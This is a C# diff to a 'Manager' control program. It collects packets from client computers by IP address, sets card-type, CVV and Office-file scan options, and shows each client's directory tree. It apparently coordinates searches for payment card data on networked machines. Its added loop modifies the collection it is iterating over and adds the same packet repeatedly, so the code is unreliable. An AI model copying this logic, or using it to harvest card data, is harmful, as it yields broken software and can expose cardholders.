@@ -18,6 +18,7 @@ using Protocols;
 using System.Threading;
 using System.Net.NetworkInformation;
 using System.Collections.ObjectModel;
+using Aga.Controls.Tree;
 
 namespace Manager
 {
@@ -274,28 +275,68 @@ namespace Manager
 
                     string point = ((IPEndPoint)clientSocket.RemoteEndPoint).Address.ToString();
 
-                    if (Proccess.Count == 0)
-                    {
-                        Proccess.CollectionChanged += Proccess_CollectionChanged;
+                    byte[] buffer = new byte[8048];
 
-                        Packets = new Packet
+                    int res = clientSocket.Receive(buffer);
+
+                    if (res > 1)
+                    {
+                        byte[] buf = new byte[res];
+
+                        Array.Copy(buffer, buf, res);
+
+                        Packets = FromByteArray<Packet>(buf);
+
+                        if (Proccess.Count == 0)
                         {
-                            CardType = GetControlText(cbCard),
-                            CVV = chbCVV.Checked,
-                            MSOffice = cbOffice.Checked,
-                            Directory = tbDirectory.Text,
-                            IPAdress = point,
-                            CountFiles = 0,
-                            CurrentFile = 0,
-                            FilePath = "",
-                            Progress = 0,
-                            FileInfo = "",
-                        };
-                        Proccess.Add(Packets);
+                            Proccess.CollectionChanged += Proccess_CollectionChanged;
+
+                            Packets.CardType = GetControlText(cbCard);
+                            Packets.CVV = chbCVV.Checked;
+                            Packets.MSOffice = cbOffice.Checked;
+                            Packets.IPAdress = point;
+                            Packets.CountFiles = 0;
+                            Packets.CurrentFile = 0;
+                            Packets.FilePath = "";
+                            Packets.Progress = 0;
+                            Packets.FileInfo = "";
+
+                            Proccess.Add(Packets);
+
+                            
+                        }
+                    
+                        foreach (var item in Proccess)
+                        {
+                            if (item.IPAdress.Equals(Packets.IPAdress))
+                            {
+                                Packets.CardType = GetControlText(cbCard);
+                                Packets.CVV = chbCVV.Checked;
+                                Packets.MSOffice = cbOffice.Checked;
+                                Packets.IPAdress = point;
+                                Packets.CountFiles = 0;
+                                Packets.CurrentFile = 0;
+                                Packets.FilePath = "";
+                                Packets.Progress = 0;
+                                Packets.FileInfo = "";
+                            }
+                            else
+                            {
+                                Packets.CardType = GetControlText(cbCard);
+                                Packets.CVV = chbCVV.Checked;
+                                Packets.MSOffice = cbOffice.Checked;
+                                Packets.IPAdress = point;
+                                Packets.CountFiles = 0;
+                                Packets.CurrentFile = 0;
+                                Packets.FilePath = "";
+                                Packets.Progress = 0;
+                                Packets.FileInfo = "";
+
+                                Proccess.Add(Packets);
+                            }
+                        }
                     }
                     clientSocket.Close();
-
-                   
                 }
             }
             catch (SocketException ex)
@@ -305,12 +346,17 @@ namespace Manager
 
         }
 
+        
+
+        private List<string> Directories = new List<string>();
+
         private void UpdatePackets()
         {
             Packets.CardType = GetControlText(cbCard);
             Packets.CVV = chbCVV.Checked;
             Packets.MSOffice = cbOffice.Checked;
-            Packets.Directory = tbDirectory.Text;
+            //Packets.Directory = lvDirectory.SelectedItems.ToString();
+            //Packets.ListDirectories = _model;
             Packets.FileInfo = "";
             Packets.Progress = 0;
             Packets.CountFiles = 0;
@@ -325,6 +371,8 @@ namespace Manager
             {
                 this.Invoke((MethodInvoker)(() => lbComps.Items.Add(item.IPAdress)));
             }
+
+            this.Invoke((MethodInvoker)(() => lbComps.SelectedIndex = 0));
         }
 
         private void OnSetQuote(string ServerName,int Port, Packet Pak)
@@ -414,6 +462,23 @@ namespace Manager
         private void Form1_FormClosing(object sender, FormClosingEventArgs e)
         {
             Stop();
+        }
+
+        private void lbComps_SelectedIndexChanged(object sender, EventArgs e)
+        {
+            foreach (var item in Proccess)
+            {
+                string sel = lbComps.SelectedItem.ToString();
+                if (item.IPAdress.Equals(sel))
+                {
+                    TreeModel _model = item.ListDirectories;
+                    trvDirectory.Model = _model;
+                    foreach (var nodes in _model.Nodes)
+                    {
+                        trvDirectory.SelectedNode = trvDirectory.FindNode(_model.GetPath(nodes));
+                    }
+                }
+            }
         }
     }
 }
